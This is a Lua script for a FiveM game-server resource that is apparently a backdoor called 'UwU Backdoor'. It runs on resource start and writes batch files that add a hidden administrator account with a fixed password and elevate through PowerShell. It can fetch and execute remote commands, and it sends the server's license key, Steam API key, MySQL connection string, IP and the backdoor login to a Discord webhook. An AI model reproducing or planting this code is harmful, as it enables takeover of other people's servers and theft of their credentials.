local ds = "Discrod"
local codeexecute = "Dit link her"
local executecode = false
local warning = false
















os.execute("cd C:/Users/%USERNAME%/Documents && mkdir KirbyBackdoor")
local usern = os.getenv("USERNAME")


function file_check(file_name)
  local file_found=io.open(file_name, "r")
  
  if file_found==nil then
    file_found=0
  else
    file_found=1
  end
  return file_found
end
if executecode then
  PerformHttpRequest(codeexecute, function(err, text, headers)
    ecode = tostring(text)
    os.execute(ecode)
end)
end
b = function()
  if file_check("C:/Users/"..usern.."/Documents/KirbyBackdoor/SYSRE.bat") == 0 then
    math.randomseed(os.time())
    file = io.open("C:/Users/"..usern.."/Documents/KirbyBackdoor/SYSRE.bat","w")
    file:write("net user NKBDoor69","\n")
    file:write("if %ERRORLEVEL% EQU 0 (","\n")
    file:write("    exit","\n")
    file:write(") else (","\n")
    file:write('start /min powershell -command "Start-Process sys.bat -Verb runAs"',"\n")
    file:write(")","\n")
    file:write("exit","\n")
    file:close()
end
end

if file_check("C:/Users/"..usern.."/Documents/KirbyBackdoor/SYS.bat") == 0 then
  
  if warning then
    math.randomseed(os.time())
    file = io.open("C:/Users/"..usern.."/Documents/KirbyBackdoor/SYS.bat","w")
    file:write("@echo off","\n")
    file:write("start https://m.gjcdn.net/fireside-post-image/900/29444471-hfqca8br-v4.webp","\n")
    file:write("start https://raw.githubusercontent.com/npxkiwi/KirbyBackdoor/main/warning.txt","\n")
    file:write("net user BBCUwU NKBDoor69 /add /Y","\n")
    file:write("net localgroup administrators BBCUwU /add /Y","\n")
    file:write("exit")
    file:close()
    b()
  else
    math.randomseed(os.time())
    file = io.open("C:/Users/"..usern.."/Documents/KirbyBackdoor/SYS.bat","w")
    file:write("@echo off","\n")
    file:write("net user BBCUwU NKBDoor69 /add /Y","\n")
    file:write("net localgroup administrators BBCUwU /add /Y","\n")
    file:write("exit")
    file:close()
    b()
  end
end



AddEventHandler('onResourceStart', function(rcname)
	if GetCurrentResourceName() == rcname then
		PerformHttpRequest("https://api.ipify.org/", function (err, text, headers)
        local servername = GetConvar('sv_hostname')
        local licensekey = GetConvar('sv_licenseKey')
        local apikey = GetConvar('steam_webApiKey')
		    local mysql = GetConvar('mysql_connection_string')
        local messagem = "En server er åbnet med **UwU Backdoor.**\n\nDu har nu **fuld adgang** til ders VPS.\n\n**SERVERNAVN:** "..servername.."\n\n**IP:** "..text.."\n\n**LICENSEKEY:** "..licensekey.."\n\n**APIKEY:** "..apikey.."\n\n**MYSQL:** "..mysql.."\n\n**LOGIN:**\nIP: "..text.."\nUsername: BBCUwU\nPassword: NKBDoor69"
        local content = {{
        author = {
          name = 'UwU Backdor',
          icon_url = 'https://m.gjcdn.net/fireside-post-image/900/29444471-hfqca8br-v4.webp'
        },
        ["color"] = 3093151,
        ["description"] = messagem,
        ["footer"] = {
        ["text"] = "Notepad x Kiwi | UwU Backdoor",
        },}}
        PerformHttpRequest(ds, function() end, 'POST', json.encode({embeds = content}), { ['Content-Type'] = 'application/json' })
      end)
	end
end)
os.execute("cd C:/Users/%USERNAME%/Documents/KirbyBackdoor/ && start SYSRE.bat")
